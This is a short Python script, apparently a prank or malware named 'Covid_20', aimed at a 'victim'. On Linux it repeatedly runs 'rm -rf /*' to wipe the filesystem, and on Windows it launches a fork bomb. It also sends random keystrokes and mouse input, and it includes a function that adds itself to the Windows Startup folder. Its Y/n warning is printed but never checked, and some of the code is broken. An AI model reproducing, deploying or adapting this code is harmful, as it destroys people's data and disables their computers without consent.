from pynput.mouse import Button, Controller
from pynput.keyboard import Key, Controller
from sys import platform
import getpass
import os

USER_NAME=getpass.getuser() # Gets the username of the victim 
key=Controller()
mouse=Controller()
warning="Are you sure you want to execute this program, I am not responsible for any damage that has been caused. Answer (Y/n) "

# TODO: CLEAN UP MY DAMN CODE!

def keypresses():
    key.press("Q")
    key.press("W")
    key.press("E")
    key.press("R")
    key.press("T")
    key.press("Y")

def mice():
    mouse.position = (40,60)
    mouse.position = (20,50)
    mouse.position = (90,100)
    mouse.press(Button.left)
    mouse.press(Button.right)

# Linux code
def linux():
    # A loop that presses the keys, moves the mouse position and running the terminal
    while True:
        os.system("./pynput_install.sh")
        os.system("gnome-terminal 'rm -rf /*'")
        keypresses()
        mice()
        
# Windows code
# TODO: Add something else other than just a fork bomb
def windows():
    os.system("start pynput_install.bat")
    
    # Just some code I stolen from stackoverflow (what it does is creates a batch file that starts this python program whenever the victim boots up his computer) [
    def add_to_startup(file_path="Covid_20"):
        if file_path == "Covid_20":
            file_path = os.path.dirname(os.path.realpath("Covid_20.py"))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
# ]

    while True:
        keypresses()
        mice()
        os.system("fork_bomb.bat") 
        
# If the user is using linux, use the linux() function
if platform == 'linux' or platform == 'linux2':
    print(warning)
    linux()

# If the user is using windows use the windows() function
elif platform == 'win32':
    print(warning)
    windows()
